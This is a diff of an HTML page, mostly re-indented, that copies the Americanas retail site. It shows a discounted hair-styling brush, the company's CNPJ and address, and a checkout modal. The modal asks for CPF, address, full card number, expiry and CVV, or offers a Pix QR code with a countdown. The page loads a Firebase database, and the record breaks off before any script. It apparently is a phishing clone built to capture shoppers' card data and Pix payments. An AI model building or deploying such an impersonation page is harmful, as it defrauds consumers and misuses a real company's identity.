@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -10,7 +11,7 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
-        /* ==================== ESTILOS GLOBAIS ==================== */
+        /* ==================== SEUS ESTILOS (COMPLETOS) ==================== */
         * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', Roboto, sans-serif; }
         body { background-color:#f0f2f5; }
         .wrapper { max-width:1280px; margin:0 auto; background:white; box-shadow:0 0 20px rgba(0,0,0,0.05); }
@@ -150,705 +151,706 @@
     </style>
 </head>
 <body>
-<div class="wrapper">
-    <!-- Header -->
-    <div class="top-header">
-        <div class="logo-area">
-            <div class="logo-text">
-                <div class="logo-line"></div>
-                <span>americanas</span>
-                <div class="logo-line"></div>
-            </div>
-            <div class="header-icons">
-                <i class="fas fa-home"></i>
-                <i class="fas fa-heart"></i>
-                <i class="fas fa-shopping-basket"></i>
-            </div>
-        </div>
-        <div class="search-bar">
-            <input type="text" placeholder="busque aqui seu produto">
-            <button><i class="fas fa-search"></i></button>
-        </div>
-        <div class="login-area">
-            <i class="fas fa-user-circle"></i>
-        </div>
-    </div>
-
-    <div class="nav-links">
-        <span><i class="fas fa-store"></i> todos os departamentos</span>
-        <span>mercado</span><span>climatização</span><span>celulares</span><span>eletrodomésticos</span>
-        <span>informática</span><span>áudio e vídeo</span><span>eletroportáteis</span><span>móveis</span><span>beleza</span>
-    </div>
-
-    <div class="breadcrumb" id="breadcrumb">
-        <i class="fas fa-home"></i> página inicial <i class="fas fa-chevron-right"></i> beleza <i class="fas fa-chevron-right"></i> escovas modeladoras <i class="fas fa-chevron-right"></i> escova modeladora 5 em 1
-    </div>
-
-    <div id="product-page" class="product-container">
-        <div class="product-grid">
-            <!-- Galeria -->
-            <div class="gallery">
-                <div class="main-image-container">
-                    <img id="mainProductImage" class="main-image" src="https://americanas.vtexassets.com/arquivos/ids/17125823-1280-auto/7498457202_1_xlarge.webp?v=638754740609930000&quality=9" alt="Escova Modeladora 5 em 1">
-                    <button class="nav-arrow left" id="prevImageBtn"><i class="fas fa-chevron-left"></i></button>
-                    <button class="nav-arrow right" id="nextImageBtn"><i class="fas fa-chevron-right"></i></button>
+    <div class="wrapper">
+        <!-- Header -->
+        <div class="top-header">
+            <div class="logo-area">
+                <div class="logo-text">
+                    <div class="logo-line"></div>
+                    <span>americanas</span>
+                    <div class="logo-line"></div>
                 </div>
-                <div class="thumbnails-row">
-                    <div class="thumb" data-index="0"><img src="https://americanas.vtexassets.com/arquivos/ids/17125823-1280-auto/7498457202_1_xlarge.webp?v=638754740609930000&quality=9" alt=""></div>
-                    <div class="thumb" data-index="1"><img src="https://americanas.vtexassets.com/arquivos/ids/17125794-1280-auto/7498457202_2_xlarge.webp?v=638754740608830000&quality=9" alt=""></div>
-                    <div class="thumb" data-index="2"><img src="https://americanas.vtexassets.com/arquivos/ids/17125665-1280-auto/7498457202_3_xlarge.webp?v=638754740607900000&quality=9" alt=""></div>
+                <div class="header-icons">
+                    <i class="fas fa-home"></i>
+                    <i class="fas fa-heart"></i>
+                    <i class="fas fa-shopping-basket"></i>
                 </div>
             </div>
-            <!-- Detalhes -->
-            <div class="details">
-                <h2 style="margin-top:0; margin-bottom:15px;">Escova Modeladora 5 em 1 Secador Potente 110V</h2>
-                <div class="price-box">
-                    <span class="old-price">R$ 339,90</span> <span class="discount">44%</span>
-                    <div class="pix-price">R$ 188,92 <span style="font-size:16px; color:#333;">no Pix</span></div>
-                    <div class="installment"><i class="fas fa-credit-card"></i> R$ 339,90 em até 6x de R$ 56,65 sem juros</div>
-                    <div class="installment"><i class="fas fa-credit-card"></i> Ou em até 12x de R$ 28,32 no cartão Cliente A</div>
-                </div>
-                <div class="badges"></div>
-                <div class="cep-block">
-                    <input type="text" placeholder="digite seu CEP" id="cepInput">
-                    <button id="calcFrete">ok</button>
-                    <span style="font-size:14px;">calcular frete e prazo</span>
-                </div>
-                
-                <div id="enderecoInfo" class="endereco-info">
-                    <div class="endereco-linha">
-                        <i class="fas fa-map-marker-alt"></i>
-                        <span id="enderecoCompleto"></span>
+            <div class="search-bar">
+                <input type="text" placeholder="busque aqui seu produto">
+                <button><i class="fas fa-search"></i></button>
+            </div>
+            <div class="login-area">
+                <i class="fas fa-user-circle"></i>
+            </div>
+        </div>
+
+        <div class="nav-links">
+            <span><i class="fas fa-store"></i> todos os departamentos</span>
+            <span>mercado</span><span>climatização</span><span>celulares</span><span>eletrodomésticos</span>
+            <span>informática</span><span>áudio e vídeo</span><span>eletroportáteis</span><span>móveis</span><span>beleza</span>
+        </div>
+
+        <div class="breadcrumb" id="breadcrumb">
+            <i class="fas fa-home"></i> página inicial <i class="fas fa-chevron-right"></i> beleza <i class="fas fa-chevron-right"></i> escovas modeladoras <i class="fas fa-chevron-right"></i> escova modeladora 5 em 1
+        </div>
+
+        <div id="product-page" class="product-container">
+            <div class="product-grid">
+                <!-- Galeria -->
+                <div class="gallery">
+                    <div class="main-image-container">
+                        <img id="mainProductImage" class="main-image" src="https://americanas.vtexassets.com/arquivos/ids/17125823-1280-auto/7498457202_1_xlarge.webp?v=638754740609930000&quality=9" alt="Escova Modeladora 5 em 1">
+                        <button class="nav-arrow left" id="prevImageBtn"><i class="fas fa-chevron-left"></i></button>
+                        <button class="nav-arrow right" id="nextImageBtn"><i class="fas fa-chevron-right"></i></button>
                     </div>
-                    <div class="entrega-opcoes">
-                        <div class="entrega-item">
-                            <i class="fas fa-chevron-right"></i>
-                            <span>receber em até 3 dias úteis</span>
-                        </div>
-                        <div class="entrega-item">
-                            <i class="fas fa-truck"></i>
-                            <span class="entrega-valor" id="freteValorDisplay">Grátis</span>
-                        </div>
+                    <div class="thumbnails-row">
+                        <div class="thumb" data-index="0"><img src="https://americanas.vtexassets.com/arquivos/ids/17125823-1280-auto/7498457202_1_xlarge.webp?v=638754740609930000&quality=9" alt=""></div>
+                        <div class="thumb" data-index="1"><img src="https://americanas.vtexassets.com/arquivos/ids/17125794-1280-auto/7498457202_2_xlarge.webp?v=638754740608830000&quality=9" alt=""></div>
+                        <div class="thumb" data-index="2"><img src="https://americanas.vtexassets.com/arquivos/ids/17125665-1280-auto/7498457202_3_xlarge.webp?v=638754740607900000&quality=9" alt=""></div>
                     </div>
                 </div>
-
-                <div class="quantity">
-                    <span>quantidade:</span>
-                    <select id="quantidadeSelect">
-                        <option value="1">1 unidade</option>
-                        <option value="2">2 unidades</option>
-                        <option value="3">3 unidades</option>
-                    </select>
-                </div>
-                <button class="comprar-btn" id="comprarBtn"><i class="fas fa-shopping-cart"></i> Comprar</button>
-                
-                <p style="margin-top:20px;"><strong>Cor:</strong> <span style="border:1px solid; padding:4px 8px;">Prata e Rosa</span></p>
-                <p><strong>Voltagem:</strong> 110V</p>
-                <p><a href="#" id="trocaLink" style="color:#e31e2e;"><i class="fas fa-undo-alt"></i> política de troca e devolução</a></p>
-            </div>
-        </div>
-
-        <!-- Informações, avaliações, perguntas, vendedor -->
-        <div class="info-block">
-            <h3><i class="fas fa-info-circle"></i> Informações do Produto</h3>
-            <p>Obtenha um estilo impecável com a Escova Secadora 5 em 1, oferecendo uma gama versátil de funcionalidades para o cuidado completo do cabelo feminino. Esta inovadora ferramenta combina as funções de escova de ar quente, volumizador de cabelo, massageador de couro cabeludo, modelador e alisador, tudo em um único dispositivo.</p>
-            <p>Com tecnologia avançada de coleta de ar e uma ampla estrutura de duto de ar, esta escova pode liberar um fluxo de ar de alta velocidade, proporcionando resultados rápidos e eficazes. O vento gerado é potente e concentrado, garantindo uma modelagem precisa e eficiente. Além disso, é equipada com íons hidratantes que ajudam a reduzir o tempo de secagem, ao mesmo tempo em que proporcionam cabelos mais macios e com brilho extra, graças aos íons negativos.</p>
-
-            <h3><i class="fas fa-clipboard-list"></i> Ficha Técnica</h3>
-            <table class="specs-table">
-                <tr><td>Cor</td><td>Prata e Rosa</td></tr>
-                <tr><td>Tensão</td><td>110V</td></tr>
-                <tr><td>Potência</td><td>1000W</td></tr>
-                <tr><td>Temperatura Ajustável</td><td>100-230°C</td></tr>
-                <tr><td>Comprimento do Cabo</td><td>Aproximadamente 2 metros</td></tr>
-                <tr><td>Bicos de Ar</td><td>Bocal de Ar Liso, Bocal de Ar de Modelagem, Bico de Ar Difuso</td></tr>
-                <tr><td>Configurações de Calor</td><td>Ar Frio Forte, Ar Quente Baixo, Ar Quente Alto</td></tr>
-                <tr><td>Material</td><td>ABS + Liga de Alumínio</td></tr>
-                <tr><td>Revestimento</td><td>Cerâmica para Proteção e Brilho Adicionais</td></tr>
-            </table>
-
-            <h3><i class="fas fa-star"></i> Avaliações dos Clientes</h3>
-            <div class="rating-row">
-                <span class="stars">★★★★☆</span> 4.5/5 (12 avaliações)
-                <span style="margin-left:15px;"><a href="#" id="queroAvaliarBtn" style="color:#e31e2e;"><i class="fas fa-pencil-alt"></i> Quero avaliar</a></span>
-            </div>
-            <div class="rating-distribution">
-                <div class="rating-row-dist"><span class="stars-label">5 estrelas</span><div class="progress-bar"><div class="progress-fill" style="width:86.08%"></div></div><span class="percentage">86%</span></div>
-                <div class="rating-row-dist"><span class="stars-label">4 estrelas</span><div class="progress-bar"><div class="progress-fill" style="width:7.22%"></div></div><span class="percentage">7%</span></div>
-                <div class="rating-row-dist"><span class="stars-label">3 estrelas</span><div class="progress-bar"><div class="progress-fill" style="width:1.55%"></div></div><span class="percentage">2%</span></div>
-                <div class="rating-row-dist"><span class="stars-label">2 estrelas</span><div class="progress-bar"><div class="progress-fill" style="width:0%"></div></div><span class="percentage">0%</span></div>
-                <div class="rating-row-dist"><span class="stars-label">1 estrela</span><div class="progress-bar"><div class="progress-fill" style="width:5.15%"></div></div><span class="percentage">5%</span></div>
-            </div>
-            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
-                <span><strong>5 avaliações para esse produto</strong></span>
-                <span style="color:#666;">ordenar: <select id="sortSelect" style="padding:5px;"><option value="helpful">Mais úteis</option><option value="recent">Mais recentes</option></select></span>
-            </div>
-            <div id="reviewsContainer"></div>
-            <p><a href="#" id="verMaisAvaliacoes" style="display:none;">Ver todas as 5 avaliações</a></p>
-
-            <h3><i class="fas fa-question-circle"></i> Perguntas & respostas</h3>
-            <div class="qa-item"><div class="qa-question">P: Esta escova funciona em cabelos muito crespos?</div><div class="qa-answer">R: Sim, a escova modeladora 5 em 1 é eficaz em todos os tipos de cabelo, incluindo crespos. As diferentes temperaturas e bicos ajudam a modelar conforme necessário.</div></div>
-            <div class="qa-item"><div class="qa-question">P: Qual a diferença entre os 3 níveis de temperatura?</div><div class="qa-answer">R: Nível 1: temperatura moderada para secagem suave; Nível 2: alta temperatura para secagem rápida; Nível 3: temperatura mais alta para modelagem e styling rápido.</div></div>
-            <div class="qa-item"><div class="qa-question">P: A escova esquenta muito a ponto de queimar o cabelo?</div><div class="qa-answer">R: Não, o revestimento de cerâmica distribui o calor uniformemente e protege os fios. Recomenda-se usar um protetor térmico antes da modelagem.</div></div>
-            <div class="qa-item"><div class="qa-question">P: Pode ser usada em cabelo úmido?</div><div class="qa-answer">R: Sim, a escova foi projetada para secar e modelar cabelos úmidos. Para melhores resultados, remova o excesso de água com uma toalha antes de usar.</div></div>
-            <p><a href="#">Ver mais perguntas</a></p>
-
-            <h3><i class="fas fa-store"></i> Sobre o vendedor</h3>
-            <div class="seller-info">
-                <h4>Beleza&Estilo Oficial</h4>
-                <p><i class="fas fa-map-marker-alt"></i> São Paulo - SP</p>
-                <p><i class="fas fa-star"></i> 4.7/5 (8.234 vendas)</p>
-                <p><i class="fas fa-clock"></i> Membro desde 2018</p>
-                <p><a href="#">Ver loja</a></p>
-            </div>
-
-            <div class="footer-links-mini">
-                <span>sac 4003 4848</span>
-                <span>guia de segurança</span>
-                <span>volta às aulas</span>
-                <span>entregas e devoluções</span>
-            </div>
-
-            <div class="footer-sections">
-                <div><h4>Institucional</h4><ul><li>investidores americanas sa</li><li>governança corporativa</li><li>lojas americanas</li><li>assessoria de imprensa</li><li>trabalhe conosco</li><li>nossas lojas</li><li>volta às aulas</li><li>cadastro de proteção à propriedade intelectual</li><li>canal de denúncias</li><li>programa de afiliados</li></ul></div>
-                <div><h4>Dúvidas</h4><ul><li>central de atendimento</li><li>entregas e devoluções</li><li>mapa do site</li><li>processo de entrega</li><li>aviso de privacidade</li><li>regras do site</li><li>guia de segurança</li><li>termos e condições de compra e venda de produtos</li><li>procon-rj</li><li>verifique o código anatel</li><li>cupom de desconto</li><li>marketplace</li><li>regras para compras internacionais</li></ul></div>
-                <div><h4>Serviços</h4><ul><li>cliente a</li><li>tipos de entrega</li><li>seguro roubo e furto</li><li>instalação de ar condicionado</li><li>garantia estendida</li><li>vale presente</li><li>para empresas</li><li>confira todos</li></ul></div>
-                <div><h4>AME Digital</h4><ul><li>comunicado</li></ul></div>
-            </div>
-
-            <div class="payment-methods">
-                <strong>Formas de pagamento:</strong> Mastercard, Visa, Elo, American Express, Aura, Diners Club, Hipercard; BrasilCard; Cartão Cliente a; Pix.
-            </div>
-            <p style="font-size:14px; color:#666;">Imagens meramente ilustrativas. Todas as informações divulgadas são de responsabilidade do fabricante/fornecedor.</p>
-            <div class="procon-row">
-                <span>Selo Procon</span>
-                <span class="logo-footer-img">americanas</span>
-            </div>
-            <div class="social-row">
-                <i class="fab fa-instagram"></i> instagram americanas ·
-                <i class="fab fa-youtube"></i> youtube americanas ·
-                <i class="fab fa-facebook"></i> facebook americanas ·
-                <i class="fab fa-tiktok"></i> tiktok americanas
-            </div>
-            <div class="cnpj-row">
-                americanas s.a. / CNPJ: 00.776.574/0006-60 / Inscrição Estadual: 85.687.08-5 / Endereço Rua Sacadura Cabral, 102 - Rio de Janeiro, RJ - 20081-902
-            </div>
-            <div class="mapa-site">Mapa do site</div>
-        </div>
-    </div>
-
-    <div id="returns-page" class="returns-container">
-        <h2><i class="fas fa-undo-alt"></i> devolução</h2>
-        <p>Você pode conferir todos os detalhes na nossa política de entregas e devoluções...</p>
-        <div class="returns-section">
-            <div class="returns-header" onclick="toggleSection(this)"><i class="fas fa-chevron-right"></i> Resumo da política</div>
-            <div class="returns-content hidden"><p><strong>Política de devoluções:</strong></p><p>- Para devolver um produto o prazo é de até 7 (sete) dias corridos;</p><p>- A exceção são os itens de moda como bolsas, sapatos e roupas, vendidos e entregues pela Americanas, que podem ser devolvidos em até 30 (trinta) dias corridos;</p><p>- Estando dentro desses prazos, a devolução é grátis!</p></div>
-        </div>
-        <p><a href="#" id="backToProduct" style="color:#e31e2e;">← voltar para o produto</a></p>
-    </div>
-</div>
-
-<!-- Modal de compra -->
-<div id="checkoutModal" class="modal">
-    <div class="modal-content" id="modalContent">
-        <span class="close-modal" id="closeModal">&times;</span>
-        <div id="checkoutStep1">
-            <h2>Dados pessoais</h2>
-            <div id="dadosPessoaisContainer" class="dados-pessoais-container">
-                <div class="form-group"><label>E-mail</label><input type="email" id="email" placeholder="obrigatório"></div>
-                <div class="form-group"><label>Primeiro nome</label><input type="text" id="primeiroNome" placeholder="obrigatório"></div>
-                <div class="form-group"><label>Último nome</label><input type="text" id="ultimoNome" placeholder="obrigatório"></div>
-                <div class="form-group"><label>CPF</label><input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14"></div>
-                <div class="form-group"><label>Telefone</label><input type="text" id="telefone" placeholder="(21) 99999-9999" maxlength="15"></div>
-            </div>
-
-            <div id="entregaSection">
-                <h2 style="margin-top:30px;">Entrega</h2>
-                <div id="enderecoContainer">
-                    <div class="form-group">
-                        <label>CEP</label>
-                        <div class="cep-row">
-                            <input type="text" id="modalCep" placeholder="digite seu CEP" maxlength="9">
-                            <button id="buscarCep">OK</button>
+                <!-- Detalhes -->
+                <div class="details">
+                    <h2 style="margin-top:0; margin-bottom:15px;">Escova Modeladora 5 em 1 Secador Potente 110V</h2>
+                    <div class="price-box">
+                        <span class="old-price">R$ 339,90</span> <span class="discount">44%</span>
+                        <div class="pix-price">R$ 188,92 <span style="font-size:16px; color:#333;">no Pix</span></div>
+                        <div class="installment"><i class="fas fa-credit-card"></i> R$ 339,90 em até 6x de R$ 56,65 sem juros</div>
+                        <div class="installment"><i class="fas fa-credit-card"></i> Ou em até 12x de R$ 28,32 no cartão Cliente A</div>
+                    </div>
+                    <div class="badges"></div>
+                    <div class="cep-block">
+                        <input type="text" placeholder="digite seu CEP" id="cepInput">
+                        <button id="calcFrete">ok</button>
+                        <span style="font-size:14px;">calcular frete e prazo</span>
+                    </div>
+                    
+                    <div id="enderecoInfo" class="endereco-info">
+                        <div class="endereco-linha">
+                            <i class="fas fa-map-marker-alt"></i>
+                            <span id="enderecoCompleto"></span>
+                        </div>
+                        <div class="entrega-opcoes">
+                            <div class="entrega-item">
+                                <i class="fas fa-chevron-right"></i>
+                                <span>receber em até 3 dias úteis</span>
+                            </div>
+                            <div class="entrega-item">
+                                <i class="fas fa-truck"></i>
+                                <span class="entrega-valor" id="freteValorDisplay">Grátis</span>
+                            </div>
                         </div>
                     </div>
-                    <div class="address-fields">
-                        <div class="form-group full-width"><label>Logradouro</label><input type="text" id="rua" placeholder="Rua, Avenida..."></div>
-                        <div class="form-group"><label>Número</label><input type="text" id="numero" placeholder="nº"></div>
-                        <div class="form-group"><label>Complemento</label><input type="text" id="complemento" placeholder="opcional"></div>
-                        <div class="form-group"><label>Bairro</label><input type="text" id="bairro" placeholder="Bairro"></div>
-                        <div class="form-group"><label>Cidade</label><input type="text" id="cidade" placeholder="Cidade"></div>
-                        <div class="form-group"><label>UF</label><input type="text" id="uf" placeholder="UF" maxlength="2"></div>
+
+                    <div class="quantity">
+                        <span>quantidade:</span>
+                        <select id="quantidadeSelect">
+                            <option value="1">1 unidade</option>
+                            <option value="2">2 unidades</option>
+                            <option value="3">3 unidades</option>
+                        </select>
                     </div>
+                    <button class="comprar-btn" id="comprarBtn"><i class="fas fa-shopping-cart"></i> Comprar</button>
+                    
+                    <p style="margin-top:20px;"><strong>Cor:</strong> <span style="border:1px solid; padding:4px 8px;">Prata e Rosa</span></p>
+                    <p><strong>Voltagem:</strong> 110V</p>
+                    <p><a href="#" id="trocaLink" style="color:#e31e2e;"><i class="fas fa-undo-alt"></i> política de troca e devolução</a></p>
+                </div>
+            </div>
+
+            <!-- Informações, avaliações, perguntas, vendedor -->
+            <div class="info-block">
+                <h3><i class="fas fa-info-circle"></i> Informações do Produto</h3>
+                <p>Obtenha um estilo impecável com a Escova Secadora 5 em 1, oferecendo uma gama versátil de funcionalidades para o cuidado completo do cabelo feminino. Esta inovadora ferramenta combina as funções de escova de ar quente, volumizador de cabelo, massageador de couro cabeludo, modelador e alisador, tudo em um único dispositivo.</p>
+                <p>Com tecnologia avançada de coleta de ar e uma ampla estrutura de duto de ar, esta escova pode liberar um fluxo de ar de alta velocidade, proporcionando resultados rápidos e eficazes. O vento gerado é potente e concentrado, garantindo uma modelagem precisa e eficiente. Além disso, é equipada com íons hidratantes que ajudam a reduzir o tempo de secagem, ao mesmo tempo em que proporcionam cabelos mais macios e com brilho extra, graças aos íons negativos.</p>
+
+                <h3><i class="fas fa-clipboard-list"></i> Ficha Técnica</h3>
+                <table class="specs-table">
+                    <tr><td>Cor</td><td>Prata e Rosa</td></tr>
+                    <tr><td>Tensão</td><td>110V</td></tr>
+                    <tr><td>Potência</td><td>1000W</td></tr>
+                    <tr><td>Temperatura Ajustável</td><td>100-230°C</td></tr>
+                    <tr><td>Comprimento do Cabo</td><td>Aproximadamente 2 metros</td></tr>
+                    <tr><td>Bicos de Ar</td><td>Bocal de Ar Liso, Bocal de Ar de Modelagem, Bico de Ar Difuso</td></tr>
+                    <tr><td>Configurações de Calor</td><td>Ar Frio Forte, Ar Quente Baixo, Ar Quente Alto</td></tr>
+                    <tr><td>Material</td><td>ABS + Liga de Alumínio</td></tr>
+                    <tr><td>Revestimento</td><td>Cerâmica para Proteção e Brilho Adicionais</td></tr>
+                </table>
+
+                <h3><i class="fas fa-star"></i> Avaliações dos Clientes</h3>
+                <div class="rating-row">
+                    <span class="stars">★★★★☆</span> 4.5/5 (12 avaliações)
+                    <span style="margin-left:15px;"><a href="#" id="queroAvaliarBtn" style="color:#e31e2e;"><i class="fas fa-pencil-alt"></i> Quero avaliar</a></span>
+                </div>
+                <div class="rating-distribution">
+                    <div class="rating-row-dist"><span class="stars-label">5 estrelas</span><div class="progress-bar"><div class="progress-fill" style="width:86.08%"></div></div><span class="percentage">86%</span></div>
+                    <div class="rating-row-dist"><span class="stars-label">4 estrelas</span><div class="progress-bar"><div class="progress-fill" style="width:7.22%"></div></div><span class="percentage">7%</span></div>
+                    <div class="rating-row-dist"><span class="stars-label">3 estrelas</span><div class="progress-bar"><div class="progress-fill" style="width:1.55%"></div></div><span class="percentage">2%</span></div>
+                    <div class="rating-row-dist"><span class="stars-label">2 estrelas</span><div class="progress-bar"><div class="progress-fill" style="width:0%"></div></div><span class="percentage">0%</span></div>
+                    <div class="rating-row-dist"><span class="stars-label">1 estrela</span><div class="progress-bar"><div class="progress-fill" style="width:5.15%"></div></div><span class="percentage">5%</span></div>
+                </div>
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+                    <span><strong>5 avaliações para esse produto</strong></span>
+                    <span style="color:#666;">ordenar: <select id="sortSelect" style="padding:5px;"><option value="helpful">Mais úteis</option><option value="recent">Mais recentes</option></select></span>
+                </div>
+                <div id="reviewsContainer"></div>
+                <p><a href="#" id="verMaisAvaliacoes" style="display:none;">Ver todas as 5 avaliações</a></p>
+
+                <h3><i class="fas fa-question-circle"></i> Perguntas & respostas</h3>
+                <div class="qa-item"><div class="qa-question">P: Esta escova funciona em cabelos muito crespos?</div><div class="qa-answer">R: Sim, a escova modeladora 5 em 1 é eficaz em todos os tipos de cabelo, incluindo crespos. As diferentes temperaturas e bicos ajudam a modelar conforme necessário.</div></div>
+                <div class="qa-item"><div class="qa-question">P: Qual a diferença entre os 3 níveis de temperatura?</div><div class="qa-answer">R: Nível 1: temperatura moderada para secagem suave; Nível 2: alta temperatura para secagem rápida; Nível 3: temperatura mais alta para modelagem e styling rápido.</div></div>
+                <div class="qa-item"><div class="qa-question">P: A escova esquenta muito a ponto de queimar o cabelo?</div><div class="qa-answer">R: Não, o revestimento de cerâmica distribui o calor uniformemente e protege os fios. Recomenda-se usar um protetor térmico antes da modelagem.</div></div>
+                <div class="qa-item"><div class="qa-question">P: Pode ser usada em cabelo úmido?</div><div class="qa-answer">R: Sim, a escova foi projetada para secar e modelar cabelos úmidos. Para melhores resultados, remova o excesso de água com uma toalha antes de usar.</div></div>
+                <p><a href="#">Ver mais perguntas</a></p>
+
+                <h3><i class="fas fa-store"></i> Sobre o vendedor</h3>
+                <div class="seller-info">
+                    <h4>Beleza&Estilo Oficial</h4>
+                    <p><i class="fas fa-map-marker-alt"></i> São Paulo - SP</p>
+                    <p><i class="fas fa-star"></i> 4.7/5 (8.234 vendas)</p>
+                    <p><i class="fas fa-clock"></i> Membro desde 2018</p>
+                    <p><a href="#">Ver loja</a></p>
                 </div>
 
-                <h2 style="margin-top:30px;">Resumo do pedido</h2>
-                <div class="resumo-pedido" id="resumoPedido">
-                    <img src="https://americanas.vtexassets.com/arquivos/ids/17125823-1280-auto/7498457202_1_xlarge.webp?v=638754740609930000&quality=9" alt="Escova Modeladora">
-                    <div class="resumo-detalhes">
-                        <h4>Escova Modeladora 5 em 1</h4>
-                        <div class="resumo-linha"><span>Subtotal</span> <span id="resumoSubtotal">R$ 339,90</span></div>
-                        <div class="resumo-linha"><span>Descontos</span> <span id="resumoDescontos">- R$ 150,98</span></div>
-                        <div class="resumo-linha"><span>Entrega</span> <span id="resumoEntrega">R$ 0,00</span></div>
-                        <div class="resumo-linha total"><span>Total</span> <span id="resumoTotal">R$ 188,92</span></div>
-                    </div>
+                <div class="footer-links-mini">
+                    <span>sac 4003 4848</span>
+                    <span>guia de segurança</span>
+                    <span>volta às aulas</span>
+                    <span>entregas e devoluções</span>
                 </div>
 
-                <h2 style="margin-top:30px;">Forma de pagamento</h2>
-                <div class="payment-options">
-                    <div class="payment-option pix selected" id="optionPix" onclick="selectPayment('pix')">
-                        <i class="fab fa-pix"></i><span>Pix</span>
-                    </div>
-                    <div class="payment-option card" id="optionCard" onclick="selectPayment('card')">
-                        <i class="fas fa-credit-card"></i><span>Cartão</span>
-                    </div>
+                <div class="footer-sections">
+                    <div><h4>Institucional</h4><ul><li>investidores americanas sa</li><li>governança corporativa</li><li>lojas americanas</li><li>assessoria de imprensa</li><li>trabalhe conosco</li><li>nossas lojas</li><li>volta às aulas</li><li>cadastro de proteção à propriedade intelectual</li><li>canal de denúncias</li><li>programa de afiliados</li></ul></div>
+                    <div><h4>Dúvidas</h4><ul><li>central de atendimento</li><li>entregas e devoluções</li><li>mapa do site</li><li>processo de entrega</li><li>aviso de privacidade</li><li>regras do site</li><li>guia de segurança</li><li>termos e condições de compra e venda de produtos</li><li>procon-rj</li><li>verifique o código anatel</li><li>cupom de desconto</li><li>marketplace</li><li>regras para compras internacionais</li></ul></div>
+                    <div><h4>Serviços</h4><ul><li>cliente a</li><li>tipos de entrega</li><li>seguro roubo e furto</li><li>instalação de ar condicionado</li><li>garantia estendida</li><li>vale presente</li><li>para empresas</li><li>confira todos</li></ul></div>
+                    <div><h4>AME Digital</h4><ul><li>comunicado</li></ul></div>
                 </div>
 
-                <div class="pix-info" id="pixInfo" style="display:block;">
-                    <p><span class="step">1.</span> Aperte em Finalizar compra para gerar o código QR</p>
-                    <p><span class="step">2.</span> Confira os dados e realize o pagamento pelo app do seu banco</p>
+                <div class="payment-methods">
+                    <strong>Formas de pagamento:</strong> Mastercard, Visa, Elo, American Express, Aura, Diners Club, Hipercard; BrasilCard; Cartão Cliente a; Pix.
                 </div>
-
-                <div class="card-form" id="cardForm">
-                    <h3>Dados do cartão</h3>
-                    <div class="form-group"><label>Número do cartão</label><input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19"></div>
-                    <div class="form-group"><label>Nome no cartão</label><input type="text" id="cardName" placeholder="Como está no cartão"></div>
-                    <div class="form-group"><label>CPF do titular</label><input type="text" id="cardCpf" placeholder="000.000.000-00" maxlength="14"></div>
-                    <div class="card-row">
-                        <div class="form-group"><label>Validade</label><input type="text" id="cardExpiry" placeholder="MM/AA" maxlength="5"></div>
-                        <div class="form-group"><label>CVV</label><input type="text" id="cardCvv" placeholder="123" maxlength="3"></div>
-                    </div>
-                    <div class="form-group"><label>Parcelas</label><select id="cardInstallments"></select></div>
+                <p style="font-size:14px; color:#666;">Imagens meramente ilustrativas. Todas as informações divulgadas são de responsabilidade do fabricante/fornecedor.</p>
+                <div class="procon-row">
+                    <span>Selo Procon</span>
+                    <span class="logo-footer-img">americanas</span>
                 </div>
-
-                <button class="finalizar-red" id="finalizarCompraBtn">FINALIZAR COMPRA</button>
+                <div class="social-row">
+                    <i class="fab fa-instagram"></i> instagram americanas ·
+                    <i class="fab fa-youtube"></i> youtube americanas ·
+                    <i class="fab fa-facebook"></i> facebook americanas ·
+                    <i class="fab fa-tiktok"></i> tiktok americanas
+                </div>
+                <div class="cnpj-row">
+                    americanas s.a. / CNPJ: 00.776.574/0006-60 / Inscrição Estadual: 85.687.08-5 / Endereço Rua Sacadura Cabral, 102 - Rio de Janeiro, RJ - 20081-902
+                </div>
+                <div class="mapa-site">Mapa do site</div>
             </div>
         </div>
 
-        <div id="pixScreen" style="display:none;" class="pix-screen">
-            <div class="timer" id="timer">30:00</div>
-            <div id="pixContent">
-                <h2><i class="fab fa-pix" style="color:#00a650;"></i> PIX QR Code</h2>
-                <p>Escaneie o código com seu celular</p>
-                <div class="qr-placeholder" id="qrPlaceholder"></div>
-                <p>Abra o app do seu banco e aponte a câmera</p>
-                <div class="pix-key" id="pixKey">Carregando...</div>
-                <button class="copy-btn" id="copyPixBtn"><i class="fas fa-copy"></i> copiar chave Pix</button>
-                <div class="small-message">Se você já realizou o pagamento, clique em confirmar</div>
-                <div id="paymentStatus" class="payment-status"></div>
-                <button class="confirm-btn" id="confirmarPagamentoBtn">CONFIRMAR</button>
-                <p>Valor da compra: <strong id="pixValorCompra">R$ 188,92</strong></p>
+        <div id="returns-page" class="returns-container">
+            <h2><i class="fas fa-undo-alt"></i> devolução</h2>
+            <p>Você pode conferir todos os detalhes na nossa política de entregas e devoluções...</p>
+            <div class="returns-section">
+                <div class="returns-header" onclick="toggleSection(this)"><i class="fas fa-chevron-right"></i> Resumo da política</div>
+                <div class="returns-content hidden"><p><strong>Política de devoluções:</strong></p><p>- Para devolver um produto o prazo é de até 7 (sete) dias corridos;</p><p>- A exceção são os itens de moda como bolsas, sapatos e roupas, vendidos e entregues pela Americanas, que podem ser devolvidos em até 30 (trinta) dias corridos;</p><p>- Estando dentro desses prazos, a devolução é grátis!</p></div>
             </div>
-            <div id="expiredMessage" class="expired-message">
-                <i class="fas fa-clock"></i><p>O tempo expirou.</p><p>Para pagar, finalize sua compra novamente.</p>
-                <button id="closeExpiredBtn">FECHAR</button>
+            <p><a href="#" id="backToProduct" style="color:#e31e2e;">← voltar para o produto</a></p>
+        </div>
+    </div>
+
+    <!-- Modal de compra -->
+    <div id="checkoutModal" class="modal">
+        <div class="modal-content" id="modalContent">
+            <span class="close-modal" id="closeModal">&times;</span>
+            <div id="checkoutStep1">
+                <h2>Dados pessoais</h2>
+                <div id="dadosPessoaisContainer" class="dados-pessoais-container">
+                    <div class="form-group"><label>E-mail</label><input type="email" id="email" placeholder="obrigatório"></div>
